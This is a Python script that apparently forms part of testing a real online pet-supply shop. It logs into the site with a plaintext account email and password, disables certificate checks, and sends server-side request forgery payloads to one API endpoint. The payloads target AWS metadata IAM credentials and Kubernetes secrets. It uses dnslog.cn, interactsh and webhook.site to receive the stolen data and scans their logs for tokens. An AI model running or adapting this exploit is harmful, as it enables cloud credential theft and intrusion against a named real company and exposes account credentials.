#!/usr/bin/env python3
"""
Auto Real Impact Extraction - Gets DNS logger and webhook automatically
Goal: Extract actual data to prove REAL impact
"""
import requests
import json
import time
import re
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.verify = False
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "*/*",
})

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=15, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=15, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=15, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=15, verify=False)
            s.get("https://www.zooplus.de/account/overview", timeout=15, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

ssrf_endpoint = "/zootopia-events/api/events/sites/1"
critical_findings = []

def log_critical(title, details, data=None):
    finding = {
        "timestamp": datetime.now().isoformat(),
        "severity": "CRITICAL",
        "title": title,
        "details": details,
        "data": data
    }
    critical_findings.append(finding)
    print(f"\n[🔥 CRITICAL] {title}")
    print(f"   {details}")
    if data:
        print(f"   Data: {str(data)[:500]}")

print("="*70)
print("REAL IMPACT EXTRACTION - AUTO DNS/OOB")
print("="*70)

# Get DNS logger
print("\n[*] Getting DNS logger...")
dns_logger = None
try:
    r = requests.get("https://dnslog.cn/getdomain.php", timeout=10)
    if r.status_code == 200:
        dns_logger = r.text.strip()
        print(f"[+] DNS Logger: {dns_logger}")
except:
    print("[!] Failed to get DNS logger from dnslog.cn")
    # Try interactsh
    try:
        r = requests.post("https://interactsh.com/register", json={}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            dns_logger = data.get("correlation_id") + "." + data.get("server")
            print(f"[+] DNS Logger (interactsh): {dns_logger}")
    except:
        print("[!] Failed to get DNS logger")

# Get webhook
print("\n[*] Getting webhook...")
webhook_url = None
try:
    r = requests.get("https://webhook.site/token", timeout=10)
    if r.status_code == 200:
        token = r.json().get("uuid")
        if token:
            webhook_url = f"https://webhook.site/{token}"
            print(f"[+] Webhook: {webhook_url}")
except:
    print("[!] Failed to get webhook")

if not dns_logger and not webhook_url:
    print("\n[!] Could not get DNS logger or webhook. Trying other methods...")
else:
    print(f"\n[+] Using DNS logger: {dns_logger}")
    print(f"[+] Using webhook: {webhook_url}")

# Test DNS exfiltration
if dns_logger:
    print("\n[1] DNS EXFILTRATION...")
    targets = [
        ("AWS Instance ID", "http://169.254.169.254/latest/meta-data/instance-id"),
        ("AWS IAM Role", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("K8s Pods", "https://kubernetes.default.svc/api/v1/namespaces/default/pods?limit=1"),
    ]
    
    for name, target in targets:
        print(f"   Trying: {name}")
        # Try to make DNS lookup with data
        try:
            # Method 1: Try to inject data into subdomain
            test_url = f"http://test-{name.lower().replace(' ', '-')}.{dns_logger}"
            resp = s.post(f"{base}{ssrf_endpoint}", json={"url": test_url}, timeout=10)
            print(f"      Test DNS: {resp.status_code}")
            
            # Method 2: Try redirect to DNS logger
            resp2 = s.post(f"{base}{ssrf_endpoint}", json={
                "url": target,
                "headers": {"Location": f"http://{dns_logger}"}
            }, timeout=10)
            print(f"      Redirect: {resp2.status_code}")
        except Exception as e:
            print(f"      Error: {e}")
    
    print(f"\n[!] Check DNS logs at: https://dnslog.cn/getrecords.php")
    print(f"[!] Or check interactsh logs if using interactsh")

# Test OOB extraction
if webhook_url:
    print("\n[2] OOB EXTRACTION...")
    targets = [
        ("AWS Instance ID", "http://169.254.169.254/latest/meta-data/instance-id"),
        ("AWS IAM Role", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("K8s Secrets", "https://kubernetes.default.svc/api/v1/namespaces/default/secrets?limit=1"),
    ]
    
    for name, target in targets:
        print(f"   Trying: {name}")
        try:
            # Try various methods to send data to webhook
            methods = [
                {"headers": {"X-Callback-URL": webhook_url}},
                {"headers": {"X-Forwarded-For": webhook_url}},
                {"headers": {"X-Webhook": webhook_url}},
                {"headers": {"Location": webhook_url}},
            ]
            
            for method in methods:
                resp = s.post(f"{base}{ssrf_endpoint}", json={
                    "url": target,
                    **method
                }, timeout=10)
                print(f"      Method: {resp.status_code}")
        except Exception as e:
            print(f"      Error: {e}")
    
    print(f"\n[!] Check webhook at: {webhook_url}")

# Check results
if dns_logger:
    print("\n[3] CHECKING DNS LOGS...")
    try:
        r = requests.get("https://dnslog.cn/getrecords.php", timeout=10)
        if r.status_code == 200:
            logs = r.text
            if logs and len(logs) > 10:
                print(f"   DNS Logs: {logs[:200]}")
                if any(kw in logs.lower() for kw in ["instance", "role", "secret", "token", "i-"]):
                    log_critical("DNS Exfiltration Success", "Found data in DNS logs", logs)
    except:
        pass

if webhook_url:
    print("\n[4] CHECKING WEBHOOK...")
    try:
        r = requests.get(f"{webhook_url}/requests", timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data and len(data) > 0:
                print(f"   Webhook received {len(data)} requests")
                for req in data[:3]:
                    if req.get("content") and len(req["content"]) > 10:
                        content = req["content"]
                        if any(kw in content.lower() for kw in ["instance", "role", "secret", "token", "i-"]):
                            log_critical("OOB Exfiltration Success", "Found data in webhook", content)
    except:
        pass

# Save results
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
output_file = f"logs/real_impact_auto_{timestamp}.json"
with open(output_file, 'w', encoding='utf-8') as f:
    json.dump(critical_findings, f, indent=2, ensure_ascii=False)

print("\n" + "="*70)
print(f"[+] Results saved to: {output_file}")
print(f"[+] Critical findings: {len(critical_findings)}")
print("="*70)

if critical_findings:
    print("\n🔥 REAL IMPACT DETECTED!")
    for i, f in enumerate(critical_findings, 1):
        print(f"\n{i}. {f['title']}")
        print(f"   {f['details']}")
        print(f"   Data: {str(f.get('data', ''))[:300]}")
else:
    print("\n[!] No real impact extracted in this run.")
    print("[!] Manually check:")
    if dns_logger:
        print(f"   - DNS logs: https://dnslog.cn/getrecords.php")
    if webhook_url:
        print(f"   - Webhook: {webhook_url}")





